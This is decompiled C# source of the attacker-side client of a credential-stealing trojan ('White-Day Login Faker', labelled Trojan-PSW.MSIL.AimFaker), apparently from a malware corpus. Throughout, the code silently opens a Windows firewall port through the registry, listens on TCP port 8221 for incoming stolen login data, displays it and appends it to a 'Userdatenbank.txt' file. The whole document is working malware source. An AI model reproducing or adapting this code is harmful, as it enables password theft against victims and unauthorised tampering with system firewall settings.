// Decompiled with JetBrains decompiler
// Type: A.C
// Assembly: Login Faker CLIENT, Version=1.0.1715.28654, Culture=neutral, PublicKeyToken=null
// MVID: FB474240-BBE2-45A7-BC07-D1F9AEC0F654
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-PSW.MSIL.AimFaker.a-b067ae213c153597999e87e04cb11aa63361851f6960def3e897c42cacafa05a.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace A
{
  public class C : Form
  {
    public const int A = 161;
    public const int a = 2;
    public AsyncCallback A;
    public Socket A;
    public Socket a;
    private GroupBox A;
    private Button A;
    private TextBox A;
    private GroupBox a;
    private Button a;
    private NotifyIcon A;
    private TextBox a;
    private Label A;
    private NotifyIcon a;
    private Button B;
    private Button b;
    private Label a;
    private IContainer A;

    public C()
    {
      this.A();
      this.MouseDown += new MouseEventHandler(this.A);
    }

    protected override void Dispose(bool _param1)
    {
      if (_param1 && this.A != null)
        this.A.Dispose();
      base.Dispose(_param1);
    }

    private void A()
    {
      this.A = (IContainer) new Container();
      ResourceManager resourceManager = new ResourceManager(typeof (A.C));
      this.A = new GroupBox();
      this.A = new Label();
      this.a = new TextBox();
      this.a = new Button();
      this.A = new Button();
      this.A = new TextBox();
      this.a = new GroupBox();
      this.A = new NotifyIcon(this.A);
      this.a = new NotifyIcon(this.A);
      this.B = new Button();
      this.b = new Button();
      this.a = new Label();
      this.A.SuspendLayout();
      this.SuspendLayout();
      this.A.BackColor = System.Drawing.Color.Transparent;
      this.A.Controls.AddRange(new Control[4]
      {
        (Control) this.A,
        (Control) this.a,
        (Control) this.a,
        (Control) this.A
      });
      this.A.Location = new Point(8, 56);
      this.A.Name = "groupBox1";
      this.A.Size = new Size(312, 56);
      this.A.TabIndex = 0;
      this.A.TabStop = false;
      this.A.Text = "Kontrolle";
      this.A.Location = new Point(8, 22);
      this.A.Name = "label2";
      this.A.Size = new Size(32, 16);
      this.A.TabIndex = 5;
      this.A.Text = "Port:";
      this.a.Location = new Point(40, 18);
      this.a.Name = "textBox1";
      this.a.Size = new Size(32, 20);
      this.a.TabIndex = 4;
      this.a.Text = "8221";
      this.a.FlatStyle = FlatStyle.Flat;
      this.a.Location = new Point(152, 16);
      this.a.Name = "button1";
      this.a.Size = new Size(152, 24);
      this.a.TabIndex = 3;
      this.a.Text = "Speichern + Beenden";
      this.a.Click += new EventHandler(this.E);
      this.A.FlatStyle = FlatStyle.Flat;
      this.A.Location = new Point(80, 16);
      this.A.Name = "cmdListen";
      this.A.Size = new Size(64, 24);
      this.A.TabIndex = 2;
      this.A.Text = "Abhören";
      this.A.Click += new EventHandler(this.A);
      this.A.Location = new Point(16, 136);
      this.A.Multiline = true;
      this.A.Name = "txtDataRx";
      this.A.ReadOnly = true;
      this.A.ScrollBars = ScrollBars.Vertical;
      this.A.Size = new Size(296, 128);
      this.A.TabIndex = 1;
      this.A.Text = "";
      this.a.BackColor = System.Drawing.Color.Transparent;
      this.a.Location = new Point(8, 120);
      this.a.Name = "groupBox3";
      this.a.Size = new Size(312, 152);
      this.a.TabIndex = 3;
      this.a.TabStop = false;
      this.a.Text = "Empfangene Daten";
      this.A.Icon = (Icon) resourceManager.GetObject("notifyIcon1.Icon");
      this.A.Text = "White-Day Login Faker Client v.1.0";
      this.A.Visible = true;
      this.A.DoubleClick += new EventHandler(this.F);
      this.a.Icon = (Icon) resourceManager.GetObject("notifyIcon2.Icon");
      this.a.Text = "White-Day Login Faker Client v.1.0 - Connected";
      this.a.DoubleClick += new EventHandler(this.f);
      this.B.BackColor = System.Drawing.Color.Transparent;
      this.B.FlatStyle = FlatStyle.Flat;
      this.B.Location = new Point(8, 8);
      this.B.Name = "button2";
      this.B.Size = new Size(16, 16);
      this.B.TabIndex = 4;
      this.B.Text = "M";
      this.B.Click += new EventHandler(this.G);
      this.b.BackColor = System.Drawing.Color.Transparent;
      this.b.FlatStyle = FlatStyle.Flat;
      this.b.Location = new Point(304, 8);
      this.b.Name = "button3";
      this.b.Size = new Size(16, 16);
      this.b.TabIndex = 5;
      this.b.Text = "x";
      this.b.Click += new EventHandler(this.g);
      this.a.BackColor = System.Drawing.Color.Transparent;
      this.a.Location = new Point(80, 24);
      this.a.Name = "label1";
      this.a.Size = new Size(184, 16);
      this.a.TabIndex = 6;
      this.a.Text = "White-Day Login Faker v.1.0 Public";
      this.AutoScaleBaseSize = new Size(5, 13);
      this.BackgroundImage = (Image) resourceManager.GetObject("$this.BackgroundImage");
      this.ClientSize = new Size(330, 304);
      this.Controls.AddRange(new Control[6]
      {
        (Control) this.a,
        (Control) this.b,
        (Control) this.A,
        (Control) this.A,
        (Control) this.a,
        (Control) this.B
      });
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) resourceManager.GetObject("$this.Icon");
      this.Name = "Form1";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "White-DayLogin Faker Client v.1.0";
      this.Resize += new EventHandler(this.e);
      this.MouseDown += new MouseEventHandler(this.A);
      this.Load += new EventHandler(this.a);
      this.A.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    [STAThread]
    private static void A() => Application.Run((Form) new A.C());

    [DllImport("user32.dll", EntryPoint = "ReleaseCapture")]
    public static extern bool A();

    [DllImport("user32.dll", EntryPoint = "SendMessage")]
    public static extern int A(IntPtr _param0, int _param1, int _param2, int _param3);

    private void A(object _param1, EventArgs _param2)
    {
      try
      {
        Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", true).SetValue(this.a.Text + ":TCP", (object) (this.a.Text + ":TCP:*:Enabled:ENABLE"));
        this.A = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        int int16 = (int) Convert.ToInt16(this.a.Text, 10);
        this.A.Bind((EndPoint) new IPEndPoint(IPAddress.Any, int16));
        this.A.Listen(4);
        this.A.BeginAccept(new AsyncCallback(this.A), (object) null);
        this.A.Enabled = false;
      }
      catch (SocketException ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    public void A(IAsyncResult _param1)
    {
      try
      {
        this.a = this.A.EndAccept(_param1);
        this.A(this.a);
      }
      catch (ObjectDisposedException ex)
      {
        Debugger.Log(0, "1", "\n OnClientConnection: Socket has been closed\n");
      }
      catch (SocketException ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    public void A(Socket _param1)
    {
      try
      {
        if (this.A == null)
          this.A = new AsyncCallback(this.a);
        A.C.A state = new A.C.A();
        state.A = _param1;
        _param1.BeginReceive(state.A, 0, state.A.Length, SocketFlags.None, this.A, (object) state);
      }
      catch (SocketException ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    public void a(IAsyncResult _param1)
    {
      try
      {
        A.C.A asyncState = (A.C.A) _param1.AsyncState;
        int byteCount = asyncState.A.EndReceive(_param1);
        char[] chars = new char[(int) checked ((uint) unchecked (byteCount + 1))];
        Encoding.UTF8.GetDecoder().GetChars(asyncState.A, 0, byteCount, chars, 0);
        this.A.Text += new string(chars);
        this.A(this.a);
      }
      catch (ObjectDisposedException ex)
      {
        Debugger.Log(0, "1", "\nOnDataReceived: Socket has been closed\n");
      }
      catch (SocketException ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      this.A.Visible = false;
      this.a.Visible = true;
    }

    private void a(object _param1, EventArgs _param2)
    {
      MainMenu mainMenu = new MainMenu();
      this.Menu = mainMenu;
      new Label().ContextMenu = new ContextMenu();
      MenuItem menuItem1 = mainMenu.MenuItems.Add("&Optionen");
      menuItem1.MenuItems.Add(new MenuItem("Config erstellen", new EventHandler(this.c), Shortcut.CtrlN));
      menuItem1.MenuItems.Add("-");
      menuItem1.MenuItems.Add(new MenuItem("Beenden", new EventHandler(this.D), Shortcut.CtrlX));
      MenuItem menuItem2 = mainMenu.MenuItems.Add("&Extras");
      menuItem2.MenuItems.Add(new MenuItem("&Informationen", new EventHandler(this.B), Shortcut.CtrlI));
      menuItem2.MenuItems.Add(new MenuItem("&Hinweise", new EventHandler(this.b), Shortcut.CtrlH));
      menuItem2.MenuItems.Add(new MenuItem("&Readme", new EventHandler(this.C), Shortcut.CtrlR));
    }

    private void B(object _param1, EventArgs _param2) => new A.A().Show();

    private void b(object _param1, EventArgs _param2) => new A.a().Show();

    private void C(object _param1, EventArgs _param2) => new A.B().Show();

    private void c(object _param1, EventArgs _param2) => new A.b().Show();

    private void D(object _param1, EventArgs _param2) => Application.Exit();

    private void d(object _param1, EventArgs _param2)
    {
    }

    private void E(object _param1, EventArgs _param2)
    {
      if (Convert.ToInt16(this.A.TextLength.ToString(), 10) > (short) 10)
      {
        StreamWriter streamWriter = new StreamWriter((Stream) new FileStream("Userdatenbank.txt", FileMode.Append, FileAccess.Write));
        streamWriter.WriteLine(this.A.Text);
        streamWriter.Close();
        this.Close();
      }
      else
      {
        int num = (int) MessageBox.Show("Es wurde noch nichts empfangen, was man abspeichern könnte!");
      }
    }

    private void e(object _param1, EventArgs _param2)
    {
      if (FormWindowState.Minimized != this.WindowState)
        return;
      this.Hide();
    }

    private void F(object _param1, EventArgs _param2)
    {
      this.Show();
      this.WindowState = FormWindowState.Normal;
    }

    private void f(object _param1, EventArgs _param2)
    {
      this.Show();
      this.WindowState = FormWindowState.Normal;
    }

    private void A(object _param1, MouseEventArgs _param2)
    {
      if (_param2.Button != MouseButtons.Left)
        return;
      A.C.A();
      A.C.A(this.Handle, 161, 2, 0);
    }

    private void G(object _param1, EventArgs _param2) => this.WindowState = FormWindowState.Minimized;

    private void g(object _param1, EventArgs _param2) => this.Close();

    public class A
    {
      public Socket A;
      public byte[] A = new byte[1];
    }
  }
}
